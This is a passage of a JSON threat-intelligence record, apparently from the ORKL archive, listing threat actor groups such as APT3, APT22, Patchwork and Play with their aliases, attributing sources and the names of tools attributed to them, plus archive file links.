            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "761d1fb2-60e3-46f0-9f1c-c8a9715967d4",
            "created_at": "2023-01-06T13:46:38.269054Z",
            "updated_at": "2025-03-27T02:00:02.789278Z",
            "deleted_at": null,
            "main_name": "APT3",
            "aliases": [
                "TG-0110",
                "Group 6",
                "Buckeye",
                "Boyusec",
                "BORON",
                "BRONZE MAYFAIR",
                "Red Sylvan",
                "GOTHIC PANDA"
            ],
            "source_name": "MISPGALAXY:APT3",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7b039cc0-33b6-495a-b4ca-649d096b993d",
            "created_at": "2023-01-06T13:46:38.482654Z",
            "updated_at": "2025-03-27T02:00:02.845093Z",
            "deleted_at": null,
            "main_name": "APT22",
            "aliases": [
                "BRONZE OLIVE",
                "Group 46",
                "G0039",
                "Suckfly"
            ],
            "source_name": "MISPGALAXY:APT22",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9c884c88-2c9f-49c5-856a-2383ad1d8ef8",
            "created_at": "2024-05-01T02:03:08.152Z",
            "updated_at": "2025-03-27T02:05:17.422887Z",
            "deleted_at": null,
            "main_name": "ZINC EMERSON",
            "aliases": [
                "Dropping Elephant ",
                "EHDevel ",
                "Manul ",
                "Monsoon ",
                "Operation Hangover ",
                "Patchwork ",
                "TG-4410 ",
                "Viceroy Tiger ",
                "Confucius "
            ],
            "source_name": "Secureworks:ZINC EMERSON",
            "tools": [
                " Hanove",
                " Mac OS X KitM Spyware",
                " Proyecto2",
                " YTY Backdoor",
                "Enlighten Infostealer"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "1d0f389f-2f6c-415d-91f4-633bd6c645f7",
            "created_at": "2024-05-01T02:03:07.974188Z",
            "updated_at": "2025-03-27T02:05:17.280317Z",
            "deleted_at": null,
            "main_name": "BRONZE OLIVE",
            "aliases": [
                "Barista",
                "Group 46 ",
                "Suckfly ",
                "APT22 "
            ],
            "source_name": "Secureworks:BRONZE OLIVE",
            "tools": [
                " DestroyRAT",
                " PlugX",
                " TCP/ICMP RAT",
                "Angryrebel"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "c81067e0-9dcb-4e3f-abb0-80126519c5b6",
            "created_at": "2022-10-25T15:50:23.285448Z",
            "updated_at": "2025-03-27T02:00:55.42906Z",
            "deleted_at": null,
            "main_name": "Patchwork",
            "aliases": [
                "Hangover Group",
                "Dropping Elephant",
                "Chinastrats",
                "Operation Hangover"
            ],
            "source_name": "MITRE:Patchwork",
            "tools": [
                "NDiskMonitor",
                "QuasarRAT",
                "BackConfig",
                "TINYTYPHON",
                "AutoIt backdoor",
                "PowerSploit",
                "BADNEWS",
                "Unknown Logger",
                "Socksbot"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "06f622cb-3a78-49cf-9a4c-a6007a69325f",
            "created_at": "2022-10-25T16:07:23.315239Z",
            "updated_at": "2025-03-27T02:02:09.733197Z",
            "deleted_at": null,
            "main_name": "APT 3",
            "aliases": [
                "APT 3",
                "Bronze Mayfair",
                "Buckeye",
                "Gothic Panda",
                "Group 6",
                "Operation Clandestine Fox",
                "Operation Clandestine Fox, Part Deux",
                "Operation Clandestine Wolf",
                "Operation Double Tap",
                "Red Sylvan",
                "TG-0110",
                "UPS Team"
            ],
            "source_name": "ETDA:APT 3",
            "tools": [
                "APT3 Keylogger",
                "Agent.dhwf",
                "BKDR_HUPIGON",
                "Backdoor.APT.CookieCutter",
                "Badey",
                "Bemstour",
                "CookieCutter",
                "Destroy RAT",
                "DestroyRAT",
                "DoublePulsar",
                "EXL",
                "EternalBlue",
                "HTran",
                "HUC Packet Transmit Tool",
                "Hupigon",
                "Hupigon RAT",
                "Kaba",
                "Korplug",
                "LaZagne",
                "MFC Huner",
                "OSInfo",
                "Pirpi",
                "PlugX",
                "RedDelta",
                "RemoteCMD",
                "SHOTPUT",
                "Sogu",
                "TIGERPLUG",
                "TTCalc",
                "TVT",
                "Thoper",
                "Xamtrav",
                "remotecmd",
                "shareip",
                "w32times"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716499,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1633570933,
    "ts_modification_date": 1633570933,
    "files": {
        "pdf": "https://archive.orkl.eu/0247dfd52784898815506925107a991587fa6b3c.pdf",
        "text": "https://archive.orkl.eu/0247dfd52784898815506925107a991587fa6b3c.txt",
        "img": "https://archive.orkl.eu/0247dfd52784898815506925107a991587fa6b3c.jpg"
    }
}